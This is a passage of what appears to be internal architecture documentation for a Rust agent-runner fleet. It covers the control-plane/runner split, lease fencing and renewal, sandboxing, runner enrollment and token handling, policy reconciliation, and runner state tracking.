# Runner Fleet — `agentsfleetd` control plane + host-resident `agentsfleet-runner` execution plane

> Parent: [`README.md`](./README.md) · Sibling: [`data_flow.md`](./data_flow.md) (how one event flows through this split). · User-facing: [docs.agentsfleet.net/runners](https://docs.agentsfleet.net/runners).

> [!IMPORTANT]
> **Implemented (M80_002 cutover).** This is the runtime the codebase runs now: `agentsfleetd` is the control plane, the host-resident `agentsfleet-runner` daemon is the execution plane, and the old single-process `agentsfleetd worker` + standalone sandbox sidecar are deleted. [`data_flow.md`](./data_flow.md) traces an event through it; this file is the structural picture.

Read this when a spec touches the `agentsfleet-runner` binary, the `/v1/runners` control protocol, runner registration, the node fleet, or assignment / fencing / reclaim.

---

## Facts

Every row is extracted from the sections below; the owner column names the section that carries the full story.

| Invariant | Value | Mechanism | Owner section |
|---|---|---|---|
| Lease expiry backstop | `LEASE_TTL` = 30 s (single-sourced for the control plane in `afd_core`'s timing constants) | the next eligible ledger claim re-leases an expired slot with a higher fencing token | §Failure recovery model |
| Max run duration | `MAX_RUNTIME` hard cap | `/renew` extends to `min(now+LEASE_TTL, created_at+MAX_RUNTIME)` | §Per-lease renewal |
| Stale-writer rejection | `UZ-RUN-005` | `report` verifies the monotonic `fencing_token` in the same atomic statement that flips the lease | §System guarantees |
| Sandbox failure fails closed | `startup_posture` | the turn never runs; the lease reports `fleet_error` naming why, and nothing runs unsandboxed in its place | §System guarantees |
| Renewal refused on empty wallet | `UZ-RUN-012` | each `/renew` meters the run's slice and refuses one the wallet cannot cover; reachable for any exhausted tenant | §Money gates |
| Lost wake recovery | next eligible lease poll | every poll probes PostgreSQL, with or without a wake notification | §Failure recovery model |
| Runner datastore credentials | zero | no runner crate links `sqlx` or `redis`; the only platform surface is `/v1/runners` + `agt_r` | §The split |
| Control protocol | one enrolment route, the rest under `/v1/runners/me` | listed in the API reference's **Runner plane** group, enrolment in its **Fleet** group (`public/openapi.json`); `me` resolves from the token | §The control protocol |
| Enrollment gate | the `runner:enroll` scope | tenant `admin` JWT / `agt_t` key → `403`; `agt_r` revealed once, stored as sha256 | §Registering a runner |
| Fresh-mint liveness | `last_seen_at = 0` sentinel | a never-connected runner reads `registered`, not a fake `online` | §Runner state |
| Runner "status" | three separate categories | `status` enum + derived liveness + append-only `runner.events` | §Runner state |
| Memory isolation | one live holder per fleet | `runner.fleet_slots` keyed by `fleet_id` + time gate + capture-time fencing | §Memory continuity |
| Memory hydration | category-pinned byte window | every `core` entry first (newest-first), then the newest non-core entries; deterministic | §Memory continuity |
| Per-runner metric families | 4, in a fixed 4096-series table | overflow routes to `runner_id="_other"`; bounded footprint; zero Postgres on the OTLP export path | §Observability |
| Multi-replica gauges | counters exact via `sum by`; `active_leases` approximate | the `+1` grant and `−1` release can land on different replicas | §Multi-replica |
| Sandbox tiers | 3 (`landlock_full` · `container_nested` · `dev_none`) | the daemon reconciles each against the host's report; tier is orthogonal to egress policy | §Sandbox tiers |
| Egress policies | 3 (`allow_all` · `deny_all_egress` · `allow_list_egress`) | host-side default-deny nf_tables rules on a veth pair; port 53 dropped; IPv4 only | §Egress model |
| Cancel latency | none: a running lease is never cancelled | the heartbeat answers `ok` and names no lease; kill and pause stop new leases only | §Steer, kill, pause |
| Config freshness | resolved per lease | no cache, no reload signal; the next lease sees the change | §Config |
| Debit point | the run's usage, per renewal | the issued lease's hold is reserved; each `/renew` and the report log the slice as a usage line that the biller settles after commit | §Money gates |
| Production shape | 3 `agentsfleetd` machines | set and verified by the release workflow; runner verbs load-balance across replicas | §Multi-replica |
| Admissions queue | `fleet.admissions` where `settled_at IS NULL` | oldest unsettled row per fleet; parked heads block later work | §Datastore topology |

## Traps

Each trap is enforced in its owner section; this list is the index.

- Sticky routing is a performance hint, never ownership — correctness never blocks on one runner being alive (§Runners are cattle, not pets).
- Do not conflate runner status into one Kubernetes-style JSONB object; the three categories stay separate (§Runner state).
- There is no `runner_runtime` Postgres role, and there must never be one (§Datastore role model).
- `runner:enroll` is a token scope, not a Postgres role — it must not become a database `GRANT` (§Datastore role model).
- A lost wake does not require a repair sweep; the next poll probes PostgreSQL (§Failure recovery model).
- Sandbox tiers are not egress policy — no tier substitutes for the egress model (§Sandbox tiers).
- The live tail is never the source of truth; `report` is the durable system of record (§Live activity).
- The doorbell only prioritizes candidates; the admissions ledger owns work (§Datastore topology).
- Not a general scheduler: no autoscale, no fairness engine, no arbitrary workload types (§"Scope — an execution plane, deliberately not a control plane").
- Admission backlog is a shared-database census gauge; use the latest successful reading across replicas.
- Memory isolation does not rest on `fleet_id` scoping alone; a feature breaking single-live-holder must scope by `lease_id` first (§Memory continuity).
- No secret enters a sandbox: model keys and minted tokens stay in the supervisor, and bubblewrap starts every sandbox with a cleared environment (§Process-boundary hardening).
- Config is never cached; warm mode reuses only the sandbox shell (§Cold and warm execution).
- No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle — the deferred name-layer is eBPF/FQDN (§Egress model).

## Topology

```
 ┌─ PLATFORM ──┐      ┌─ HOST (bare metal or a VM) ─────┐
 │ agentsfleetd│      │ agentsfleet-runner (one binary) │
 │ control     │◀────▶│  supervisor: heartbeat, lease,  │
 │ plane:      │ HTTPS│  agent loop, report, activity   │
 │ owns PG +   │ pull │  (boots from pre-minted agt_r)  │
 │ Dragonfly + │agt_r │                                 │
 │ Vault API + │      │  a sandbox per lease that runs  │
 │ assignment  │      │  a tool there      ▼            │
 └──────┬──────┘      │  sandbox: executor, tool calls  │
        │             └─────────────────────────────────┘
  PG · Dragonfly · Vault
  (never leave the platform)
```

Deeper diagrams stay with their sections: the renewal timeline (§Per-lease renewal), the enrollment sequence (§Registering a runner), the two auth layers (§Datastore role model), one event's run (§Running one event), the memory carry-over (§Memory continuity), and the signal routes ([observability.md](./observability.md) §"Signal routing").

## Decisions

| Decision | Reason | Where / artifact |
|---|---|---|
| The runner holds zero datastore credentials | a compromised host cannot reach Postgres, Dragonfly, or the Vault | §Why split; M80_002 |
| Operator pre-mints `agt_r`; no host self-registration | no enrollment-grade credential ever touches a host (Option B, the GitLab-16 model) | §Registering a runner; M84_001 |
| Typed columns + event log, not a `status` JSONB | one operator-intent dimension; JSONB conditions are for many writers | §Runner state; cross-validated Jun 2026 |
| Lease expiry + fencing replaces `XAUTOCLAIM` | an off-platform processor is invisible to Dragonfly consumer-idle | §Datastore topology; M80_001 |
| Slot and admission fences advance together | a stale runner must not settle a newer claim | §Datastore topology |
| Cold-start reconciliation deferred | discovery scaffolding the future scheduler replaces (Indy-acked, M141_001 Discovery) | §Failure recovery model |
| The agent loop runs in the supervisor; only tool calls cross into a per-lease sandbox | no model key or runner token enters a sandbox, and the supervisor keeps the network a sandbox may be denied | §The split; [Runner execution](./runner_execution.md) §Process model |
| Renewal meters the run per slice (M80_010), superseding the coverage-only check | a run is charged as it runs, so an empty wallet stops it at the next renewal | §Money gates |
| Launch egress is IP-pin `nftables`; the name-layer comes later via eBPF/FQDN | no proxy and no TLS interception, at any tier | §Egress model |
| Exact gauges via a deferred Postgres refresher | keeps the export path datastore-free; deferred at current scale | §The deferred refresher |

---

## Detail

Everything below is the full reference. Headings are stable — specs cite them by text; insert new sections, never rename existing ones.

## System guarantees (read this first)

The runner fleet is an **execution plane**: stateless runners lease work, run it in a sandbox, and report back. The control plane (`agentsfleetd`) owns all durable state. Everything below is a consequence of that one decision — read the guarantees before the mechanics, because the mechanics only exist to hold these.

| Guarantee | What the platform promises | How it holds |
|---|---|---|
| **No event loss on runner death** | A runner that crashes, partitions, or is killed mid-event never drops the event. | The lease has a `lease_expires_at`; a later ledger claim re-leases the unsettled admission with a higher fence. Durability is at-least-once through `fleet.admissions` and the fenced claim. |
| **At-most-once durable effect** | A reclaimed or duplicate runner cannot double-write state. | Every lease carries a monotonic `fencing_token`; `report` verifies it in the same atomic statement that flips the lease to `reported`. A stale holder's report is rejected (`UZ-RUN-005`). |
| **Secrets never leave the trust boundary** | Tenant credentials are never written to a runner's disk, logs, or cache. | `secrets_map` rides the lease inline over Transport Layer Security (TLS), is substituted at send time by the supervisor's egress guard outside every sandbox, and is never persisted runner-side ([Runner execution](./runner_execution.md) §Credentials). |
| **Tool calls are always sandboxed** | No tenant program ever runs un-isolated. | A lease offered a tool that runs in a sandbox gets one under bubblewrap, Landlock, seccomp and its own cgroup; a sandbox that cannot be built fails **closed**: the turn never runs and the lease reports `fleet_error` as `startup_posture`. A lease whose tools all run in the supervisor starts none. |
| **The runner holds no datastore credentials** | A compromised or untrusted host cannot reach Postgres, Dragonfly, or the Vault. | No runner crate links `sqlx` or `redis` ([Runner execution](./runner_execution.md) §Crates); the only platform surface the runner reaches is the authenticated `/v1/runners` protocol carrying a `agt_r` token. |

### Runners are cattle, not pets

A runner has no durable identity that the system depends on. It is enrolled once by the operator, then leases, runs, reports, and may vanish at any moment; the control plane notices via lease expiry and hands the work to whichever runner leases next. There is no runner the fleet cannot lose. Sticky routing (below) is a *performance hint*, never ownership — correctness never blocks on one runner being alive.

## Failure recovery model

A runner's work becomes eligible when its slot expires. Another eligible runner must still poll; recovery time depends on available capacity and fleet selection.

| Failure | Recovery | Durable guard |
|---|---|---|
| Runner dies mid-lease | A later poll claims the same unsettled admission after its 30-second slot expires. | The slot and admission receive a higher fence; the old holder cannot write. |
| Wake notification lost | The next poll probes PostgreSQL without a hint. | Acceptance is already committed in `fleet.admissions`. |
| Claim decoding fails | The transaction rolls back its slot and admission changes. | Both fences remain unchanged. |
| Failure after claim commit | Release the claim where possible; otherwise wait for its deadline. | Every write verifies the current slot and admission fences. |
| Report fails before commit | Retry the report; lease, usage and settlement all roll back. | No charge or terminal admission without the report transaction. |
| Report response lost | The same runner retries and receives the stored outcome. | A repeated report adds no usage line or delivery obligation. |
| Sandbox setup fails | The runner reports `fleet_error` as `startup_posture`. | Work never runs without the assigned sandbox. |

A live runner renews through the fenced `/renew` route. Renewal remains credit-gated and bounded by `MAX_RUNTIME`.
A runner that stops renewing loses its slot at the database deadline.

### Per-lease renewal — how a long fleet keeps its lease

A renewal pushes the kill-deadline forward while the runner's lease task lives. The Rust supervisor calls `/renew` on every `RENEWAL_TICK` tick from the lease's start, carrying one line per provider request the daemon has not yet recorded, and gives the lease up at the last granted deadline less two seconds (`rustd/crates/afr_supervisor/src/renew/mod.rs`). The call atomically extends **both** the lease row and the affinity slot under a fence + the hard cap:

```
 lease issued                                every RENEWAL_TICK (5 s) tick
 (expires = now + LEASE_TTL)              posts /renew, from the lease's start
   │            tick    tick    tick    tick   tick
   ●────────────●───────●───────●───────●──────●────────────────►
                                               │ POST /renew
                                               ▼
   server, in ONE fenced atomic statement:
     • still the fencing holder?  no → 409 lease_lost  → runner cuts the run
     • credits cover the run?     no → 402 no_credits  → terminate
     • past created_at+MAX_RUNTIME? yes → 409 max_runtime → terminate + report
     • else → extend lease_expires_at AND slot.lease_expires_at to
              min(now+LEASE_TTL, created_at+MAX_RUNTIME); bump last_seen_at
                                              │
   ┌────────────────────────────────────────────────────────────────────────────┐
   │ The tick renews whatever the run is doing, so a long model call with       │
   │ no output still renews. A runner that died ticks no more, and its lease    │
   │ is reclaimed at the deadline. The runner heartbeats beside its leases      │
   │ (heartbeat, drainer and worker pool run joined), so a busy host still      │
   │ beats and §2 lapse-detection never reassigns a live long-runner's own      │
   │ lease.                                                                     │
   └────────────────────────────────────────────────────────────────────────────┘
```

A transient renewal failure retries on the next tick. At the last granted deadline, the runner stops and another runner can reclaim unsettled work. Fences reject stale durable writes; external effects retain their own retry and idempotency limits.

## Scope — an execution plane, deliberately not a control plane

The fleet borrows Kubernetes / Nomad / Temporal **semantics** — leases, fencing, node heartbeats, drain, sticky scheduling, checkpointed workloads — but it is **not** a general orchestrator and must not drift into one. The non-goals are load-bearing; each rejected feature is one we deliberately do not build until a spec changes this direction:

- **Not a general scheduler — beyond label placement.** **Label** placement (a fleet's `required_tags ⊆ runner.labels`, matched before the sticky hint) landed in **M85_001** (live: the lease query in `afd_fleet` matches `required_tags <@ labels`); capacity / fairness / autoscale stay out of scope. (The earlier "M80_007" reservation for this was a stale ID — M80_007 shipped as the runner-observability spec.)
- **No autoscale.** Runners scale by operators adding hosts, not by the platform reacting to queue depth.
- **No fairness engine.** No per-tenant weighting, no priority lanes, no preemption.
- **No arbitrary workload types.** One workload: an agent run from a leased `ExecutionPolicy`.

Without this fence the design rediscovers three control planes at once (Nomad-lite + Temporal-lite + Kubernetes-lite), each demanding its own observability, reconciliation, and high-availability story. The distributed-systems core here is sound; the risk is scope, not correctness. If the platform ever needs a true control plane, that is a larger upfront conversation (inventory / reconciliation / high-availability / placement fairness) — surface it, don't drift into it.

---

## Why split

The pre-cutover runtime ran one `agentsfleetd` binary as `serve` (the HTTP API) or `worker` (the orchestration loop), plus a standalone sandbox sidecar that owned sandboxing. Two facts made it impossible to run work on hosts the platform does not fully own:

1. **The worker was welded to the datastores.** Each per-fleet worker thread opened its own Postgres pool and Redis connections, ran ~15 write patterns on the per-event hot path, and discovered its own work by `XREADGROUP` on `fleet:{id}:events`. It could not run anywhere it could not reach Postgres and Redis directly.
2. **The connection budget grew with the fleet.** Every per-fleet thread held a dedicated blocking Redis connection; the fleet count was capped by the Redis pool ceiling, not by compute.

The cutover moved execution onto arbitrary hosts (bare metal, a Mac, a pod) that hold **no datastore credentials**, reaching the platform only over the authenticated `/v1/runners` protocol.

## The split — two binaries, no sidecar

- **`agentsfleetd`** — the control plane. Owns Postgres, Dragonfly, the Vault API, the HTTP API, and work assignment / fencing / reclaim. Its `/v1/runners` endpoints claim inbound work from `fleet.admissions`; `XREADGROUP` / `XACK` remain on the separate outbound delivery queue.
- **`agentsfleet-runner`** — the host-resident execution plane, one Rust binary. A trusted supervisor runs the lease loop and the agent loop, and each lease that runs a tool in a sandbox gets one. It holds zero datastore credentials and talks to `agentsfleetd` only over Hypertext Transfer Protocol Secure (HTTPS), carrying a `runner_token`.

The BEFORE/NOW split diagram is front-loaded in §Topology.

**Why the loop stays out of the sandbox.** The agent loop calls the model with the lease's key, and the supervisor speaks the control protocol with the runner's token; neither may sit where a tenant program runs. So the supervisor runs outside every sandbox, and a sandbox executes tool calls and nothing else, over one Unix socket per lease. The sandbox is the same binary's `sandbox` entry, bound read-only into it, so there is no second artifact to deploy ([Runner execution](./runner_execution.md) §Process model).

### Where the code lives

The build graph keeps datastore crates outside the runner. [Runner process model](runner_execution.md#crates) owns the shared crate list, including cryptography for encrypted private reports.

| Layer | Path | Build graph | Links | Role |
|---|---|---|---|---|
| wire | `rustd/crates/afd_wire` | both | none | the frozen `/v1/runners` wire types — protocol, event envelope, execution policy, execution result, activity |
| shared knobs | `rustd/crates/afd_core` | both | none | the knobs both planes key off (`LEASE_TTL`, …), `error_shell!` |
| control plane | `rustd/crates/afd_fleet` · `rustd/crates/afd_runner` · `rustd/crates/afd_api_runner` | `agentsfleetd` (`rustd/crates/agentsfleetd`) | `sqlx`, `redis` | lease / fence / reclaim / assignment, the background sweepers (`afd_runner::sweep`, started in `rustd/crates/agentsfleetd/src/sweepers/mod.rs`), and the `/v1/runners` handlers over them |
| runner | `rustd/crates/afr_supervisor` · `afr_agent` · `afr_providers` · `afr_tools` · `afr_egress` · `afr_secrets` · `afr_memory` · `afr_executor` · `afr_sandbox` · `afr_telemetry` | `agentsfleet-runner` (`rustd/crates/agentsfleet_runner`) | none | supervisor, agent loop, tool catalog, outbound guard, executor and sandbox engine; imports nothing from the control plane |

## The control protocol — `/v1/runners`

`agentsfleetd` translates the runner's calls into the Postgres writes and Dragonfly stream operations the worker did directly, so the runner never sees a datastore. The routes, their methods and their request and reply shapes are the API reference's **Runner plane** group on docs.agentsfleet.net, generated from `public/openapi.json`, with the enrolment route in its **Fleet** group; this doc does not restate them. The shape that matters here: one enrolment route, `POST /v1/runners`, called by an operator (§Registering a runner); every other route sits under `/v1/runners/me` and is called by the runner with its `agt_r`.

`me` resolves from the token — no `runner_id` in any path or body, so there is nothing to spoof or reconcile. `register` is the one verb authed by a *human operator* credential; everything else is authed by the machine credential it mints. Identity and auth are covered in [`../AUTH.md`](../AUTH.md) (the runner is the first machine principal). `register` is gated by the `runner:enroll` scope — grantable on its own, because enrolling a host into the shared fleet is the one capability that exposes every tenant's secrets to it — so a token without that scope is rejected `403`, tenant `admin` JWT and `agt_t` api_key alike.

## Registering a runner

A runner needs a `agt_r` token before it can pull work. The **platform admin pre-mints it from the dashboard** and installs it on the host — the host never self-registers (Option B, the GitLab-16 "create runner → authentication token" model). The admin opens **dashboard → Admin → Runners → "Add runner"**; a session-authed server action calls `POST /v1/runners`; `agentsfleetd` mints the `agt_r` and reveals it **once** (copy-to-clipboard, then dropped from the browser), and the admin drops it into the host's vault / `AGENTSFLEET_RUNNER_TOKEN` env var. No identity credential ever touches a shell (M84_001 retired the `register --token` CLI). On boot the daemon validates the `agt_r` prefix (fail-loud, not a silent 401 loop) and goes straight to the heartbeat/lease loop — no register call, so no host ever holds an enrollment-grade credential. There is no enrollment token; the minter must hold `runner:enroll`. The open-fleet, self-enrolling case is mode C, later.

```
 platform admin                                          agentsfleetd
 (dashboard session carrying runner:enroll)      
   │ "Add runner" server action → POST /v1/runners   🔒 GATE 1 — who may enroll:
   │   Authorization: Bearer <session-JWT>           runner:enroll scope required 
   │   { host_id, assigned_policy{sandbox_tier,     (tenant admin / agt_t → 403)
   │     network_policy, registry_allowlist[],
   │     worker_count}, labels[] }
   ├────────────────────────────────────────────────►│ mint agt_r (256-bit random)
   │                                                  │ store sha256(agt_r) + last_seen_at=0 + the ASSIGNED policy in runner.runners
   │◀──────────────────────────────────────────────────┤ 201 { runner_id, runner_token: agt_r, assigned_policy }  (revealed once)
   │ admin installs agt_r on the host (vault → env AGENTSFLEET_RUNNER_TOKEN)
   ▼
 host: agentsfleet-runner
 (env AGENTSFLEET_API_URL + AGENTSFLEET_RUNNER_TOKEN=agt_r… [+ optional RUNNER_STORAGE_HOME])
   │ boot: validate agt_r prefix, NO register call; probe kernel capability
   │ steady loop — Authorization: Bearer agt_r         🔒 GATE 2 — per-call auth:
   │      ◀── heartbeat · lease · report · activity ─┤ sha256(Bearer) == token_hash (timing-safe)
   │      heartbeat ▲ capability report · ▼ assigned policy + degraded verdict
   │      eligibility: assigned tier + scope + secret_delivery   🔒 GATE 3 — blast radius
```

`agentsfleetd` owns the Postgres pool, the Dragonfly pool, and the Vault API; `agentsfleet-runner` owns none of them and holds only the `agt_r` token. A platform operator holding `runner:write` rotates it with `PATCH /v1/fleets/runners/{id} {"action":"rotate"}`. The write swaps `token_hash` and appends an actor-attributed event atomically, returns the replacement token once, and makes the old token fail the next auth read. Revoking instead sets `status='revoked'` (M84_002) so every later call gets a 401. The runner's COMPLETE env is `AGENTSFLEET_API_URL` + `AGENTSFLEET_RUNNER_TOKEN` (+ the optional host-local `RUNNER_STORAGE_HOME`) — there is no bootstrap credential on the host, no datastore secret, and **no policy in the environment** (M148; §Assigned policy and reconciliation).

## Assigned policy and reconciliation (M148)

Configuration flows **down**. Sandbox tier, network policy, registry allowlist and worker count are attributes the control plane ASSIGNS to the runner row. They are written at enrollment and changed through `PATCH /v1/fleets/runners/{id} {assigned_policy}`. Each one rides the runner's identity on the enrollment read and on **every heartbeat reply**, so a dashboard change reaches the host within one beat and nobody visits the host.

The **heartbeat cadence travels the same way** (M205). `afd_core::timing` owns both `RUNNER_OFFLINE_AFTER` and the `HEARTBEAT_INTERVAL` served beneath it, and a compile-time assertion beside them keeps the served cadence strictly below the offline threshold. A host holds no interval of its own, so moving the threshold moves every host's beat within one cycle. The field is required rather than optional: a reply without it is refused at parse and the beat takes the existing backoff, because a runner guessing its own cadence is the drift this removes.

The host never declares policy. The per-policy environment variables that once did are removed outright rather than deprecated, so there is no fallback path two sources of truth could diverge through. The failure that removes: a dev worker advertised `landlock_full` while refusing every lease for two days, because the dashboard's tier and the host's env file held different values and nothing compared them.

Before capability can be reported it has to be established. systemd's `Delegate=cpu io memory pids` with `DelegateSubgroup=runner` starts the runner in a leaf of its own and hands it the service's cgroup (`deploy/baremetal/agentsfleet-runner.service`). The runner reads that cgroup from `/proc/self/cgroup` and makes every lease's cgroup beneath it (`rustd/crates/afr_sandbox/src/cgroup/mod.rs`). The runner playbook's readiness check fails a host whose service cgroup does not carry every required controller in its `cgroup.subtree_control` (`playbooks/lib/runner/verify.sh`).

Capability flows **up**. At boot the runner probes what the kernel can enforce: Landlock, seccomp, the delegated cgroup's controllers, bubblewrap, the toolbox's file system, `/dev/kvm`, and whether it can build an egress scope (§Egress model). A host lacking any mechanism every sandbox needs refuses `run` and says which (`rustd/crates/agentsfleet_runner/src/main.rs`). Every heartbeat carries the boot probe's report, with `egress_enforcement` set from the egress check (`rustd/crates/afr_supervisor/src/capability/mod.rs`, `rustd/crates/afr_supervisor/src/heartbeat/mod.rs`).

The heartbeat handler reconciles assigned against achievable through a pure verdict function (`afd_runner`'s reconcile module), writing the row's `degraded` flag and `degraded_reason`. The reason names the one missing mechanism in operator vocabulary — "cgroup controllers not delegated" maps to a bootstrap playbook step.

The verdict gates work on **both sides, and fails closed**. The control plane's lease handler issues nothing to a degraded row, and an unreadable verdict also issues nothing. The Rust runner's workers take no work while no decodable assignment is held: a null policy sets the worker count to zero, never the previous value and never a permissive default (`rustd/crates/afr_supervisor/src/heartbeat/mod.rs`). They do not read `degraded`; the lease handler's refusal is the one gate a degraded row meets.

A policy re-assignment re-reconciles the verdict **inside the PATCH request**, against the stored report. A tightening the host provably cannot meet degrades the row and closes the lease gate immediately.

Two windows stay open, both deliberate. A host that *can* meet the new policy keeps executing under its issue-time policy until the next beat delivers the change, so the bound is the documented heartbeat granularity. And the lease gate's read races a concurrent verdict write by at most one lease. The assumption behind both: in-flight leases finish under the policy they were issued under.

Assigned and achievable live in **separate columns** that never overwrite each other, so no code path can let a self-report become the assignment. Recovery is reconciliation and nothing more: a later report that satisfies the assignment clears the verdict on that heartbeat, and leasing resumes.

The report is unauthenticated self-assertion, so a compromised host can lie. Placement trust therefore stays operator-assigned; attestation is a separate workstream.

## Runner state — three categories, no JSONB status

A runner's "status" is three *separate* concerns; conflating them into one Kubernetes-style `status` JSONB object is the trap we deliberately avoid (cross-validated Jun 2026). Kubernetes needs `status.conditions[]` because dozens of controllers write orthogonal state onto one object; the fleet has one operator-intent dimension and a simple pull/lease loop, so typed columns + an event log stay clearer and queryable.

| Category | Where it lives | Examples | Stored? |
|---|---|---|---|
| **Operator intent** | `runner.runners.status` (typed enum) | `active` · `cordoned` · `draining` · `drained` · `revoked` | **yes** — and `status != 'active'` is the cordon/revoke auth gate (M84_002) |
| **Runtime liveness** | **derived** at read from `last_seen_at` + leases | `registered` · `online` · `busy` · `offline` | **no** — a pure function; storing it would drift |
| **History** | `runner.events` (append-only) | `runner_registered` · `lease_acquired` · `runner_offline` · `runner_revoked` | **yes** — answers "last busy?", "runs this period", "offline how long?" |

Liveness is honest because **mint stores `last_seen_at = 0`** (the never-connected sentinel): a freshly-minted runner reads **registered**, not a fake **online**, until its first heartbeat moves `last_seen_at` forward (M84_001). "Auth failed" is *not* a runner state — identity is the token, so a bad `agt_r` matches no row; it surfaces in logs/metrics, never as a row's liveness. A Kubernetes-style `status` + `conditions` JSONB split is adopted **only if** many independent subsystems ever write runner conditions (health probes, maintenance, capacity, security) — not before.

### Operator plane + reassignment

Operators read runners through `GET /v1/fleets/runners` and change them through `PATCH /v1/fleets/runners/{id}`. The read derives liveness and excludes token hashes. Lifecycle changes append actor-attributed runner events.

A runner can hold multiple active leases. Busy status derives from live leases; the server counts fleet and authoring occupancy under the runner-row lock before granting capacity. [Authoring leases](#authoring-leases) describes the shared limit.

> [!WARNING]
> Cordon and drain currently block every authenticated runner request, including renewal and reports.
> The capacity layer permits cordoned or draining renewals, but authentication accepts only `active` tokens (`afd_state/src/credentials/rows.rs`; `afd_auth/src/authenticate.rs`).
> Do not rely on these actions for graceful completion; existing work can stop and reports can remain spooled.

### Operator plane — the read surface

The runner detail read (API reference › Fleet) takes lifetime counters one-to-one from `runner.lifetime_counters`, never from the per-runner families, which are process-global, restart-zeroed and capped (§"The four per-runner families").

The counter row is maintained by the lease write paths themselves. Each transition's owning SQL statement carries its own tally arm: `acquired` with the lease insert, `succeeded` and `failed` with the report claim, `expired` with the reclaim flip. So the tallies are transactional with the rows they count, exactly-once under retry by the same guards that make the transitions exactly-once, and constant-time to read however long the history grows. It is the `fleet.activity_counters` shape extended to runners. Only the live-now summary still reads `runner.leases`, scoped to currently-active rows.

Lease history: API reference › Fleet (List a runner's leases). Neither item struct carries `token_hash` or `request_json`, so emitting either is a compile error rather than a review catch. A settled lease outlives its fleet's purge and its event's retention (`runner.leases` holds no foreign key to either; the purge deletes only the fleet's live leases), so the history keeps it with null fleet and event fields. Each item carries `destination`: `available` when the fleet exists in the caller's own account, `fleet_deleted`, or `not_permitted`. The dashboard's Open fleet link follows that field, never a fleet name.

**Lifecycle events and work events are different planes.** A successful execution appends both `lease_acquired` and `lease_released`, so a runner's raw event log roughly doubles its execution count — 4,000 executions read as ~8,000 rows. The dashboard splits them: **Leases** renders work, one row per lease with its outcome and the shared plain-English failure sentence, and **Activity** renders lifecycle records only. The client asks for the seven-tag lifecycle set (`RUNNER_LIFECYCLE_EVENT_TYPES`, one exported constant) through the comma-separated multi-value `event_type` filter, and the activity headline map is keyed on that subset, so a lease tag cannot be given a headline at compile time.

**The lease read's index support is load-bearing, not incidental.** `runner.leases` gains a row per claim and another per reclaim. One worker turning a short event every `LEASE_TTL` accrues roughly 2.9k rows a day, and `MAX_WORKER_COUNT` workers make that about 184k.

Two indexes serve the read. `idx_leases_runner_id_created_at_id` answers the page, and `idx_leases_fleet_event_id_fencing_token` answers the per-row reclaim derivation. On `runner.events`, `idx_events_runner_id_event_type_created_at_id` serves the Activity page's rare-lifecycle-tag filter and its count, so that read stops walking the per-lease bulk. A partial index was rejected there: the tag list binds as a parameter array, and a partial-index predicate cannot be proven against one. Read cost stays flat as history grows, and the index-usage integration lane pins both the shapes and the plans.

**History is bounded, not integral.** The retention sweeper (`afd_runner`'s retention sweep, started with the other sweepers in `rustd/crates/agentsfleetd/src/sweepers/mod.rs`) deletes terminal-status leases in bounded batches once 30 days pass from settlement. The clock is `updated_at`, which settle and reclaim both stamp, so a lease acquired long ago and settled yesterday keeps its full window.

Only the per-lease event tags are eligible — `PER_LEASE_EVENT_TYPES`, meaning `lease_acquired` and `lease_released`. The lifecycle tags are the Activity feed's entire content and are kept at any age.

Live rows can never age into the sweep. The predicate excludes them, and a compile-time assertion keeps `MAX_RUNTIME` below the window (`afd_runner/src/sweep/retention/tests.rs`). Every renewal stamps `updated_at`, so a lease anything still holds is at most twelve hours stale against a thirty-day cutoff.

**The sweeper is also the lease status column's only clock-driven writer.**

The runner's report, the fleet's next claim through `queue::CLAIM_HEAD`, and fleet deletion can also move a lease out of `active`. Those three changes are not time-based.

That leaves a gap. A run whose runner died, whose event was settled terminally elsewhere, on a fleet nobody messages again, would stay `active` forever — an immortal row whose per-work records the age-keyed event sweep prunes anyway, leaving an eternal "running" lease with no history behind it. The sweep flips such rows to `expired` past the same cutoff, with the `expired` tally riding the flip exactly as reclaim does, then lets them age out through their own window.

A cycle that fills every batch re-arms within the minute rather than idling the hour, so a backlog cannot outrun the sweeper. A failed cycle increments `agentsfleet_runner_retention_sweep_failures_total`, because the swept series alone cannot tell a sweeper that is not running from one that fails every pass. `idx_leases_status_updated_at` and `idx_events_event_type_created_at` serve the sweep's own `DELETE`s, which take `FOR UPDATE SKIP LOCKED` so each replica's sweeper claims a disjoint batch.

The lifetime counters survive pruning because they count transitions, not surviving rows. That is also why the counter backfill's conflict arm takes `GREATEST`: re-run after pruning, a recount is smaller than the truth, and it must never lower a tally.

Pagination: [HTTP standard](../../.orly/standards/domains/http-responses.md) HTTP-PAGE and the API reference introduction.

### The open policy questions

The surface shipped; what it should *do* in these four cases did not.

- **All-runners-down.** If every healthy runner is gone, where does cordoned/lapsed work drain to? There is no eligible target — the work must **hold** (not thrash or fail) until capacity returns.
- **Eligibility.** Label, state, liveness and shared host-capacity checks precede placement. Trust class, tenant/workspace scope and sandbox-engine eligibility remain future work.
- **Cordon rules.** When to cordon; partial vs full drain; the drain deadline; what happens if drain never completes (escalate cordon → revoke?).
- **Drain rules.** How long to wait for in-flight work before reclaiming; how the heartbeat `drain` reply composes with renewal.

## Datastore role model — why there is no `runner_runtime`

Access to the runner-domain tables (`runner.runners`, `runner.leases`, `runner.fleet_slots`) is governed at **two independent layers**. Conflating them is the recurring design error — the temptation to mint a `runner_runtime` database role "so the runner tables have an owner" collapses an authorization rule onto an authentication identity.

| Layer | Mechanism | Answers | Enforced where |
|-------|-----------|---------|----------------|
| **App authorization** | the `runner:enroll` scope on the verified token | *Which API caller* may enroll / list / manage runners | the request handlers' authorization layer |
| **Datastore identity** | `api_runtime` Postgres role | *Which process identity* writes the rows | Postgres `GRANT` |

```
   caller (Clerk JWT, runner:enroll)                  runner (agt_r token, NO db creds)
        │  GET/POST /v1/fleet, /v1/runners                  │  POST /v1/runners/me/leases
        ▼                                                   ▼
   ┌─────────────────────────────────────────────────────────────────────────┐
   │ agentsfleetd                                                            │
   │   Layer 1 — scope check: does caller hold runner:enroll? (admin routes) │
   │   Layer 2 — writes fleet.* connecting to PG as api_runtime              │
   └─────────────────────────────────────────────────────────────────────────┘
                                        ▼
            runner.runners · runner.leases · runner.fleet_slots
            GRANT SELECT, INSERT, UPDATE … TO api_runtime   (schema 021/022/023)
            — no worker_runtime grant, no runner_runtime role —
```

Three load-bearing facts:

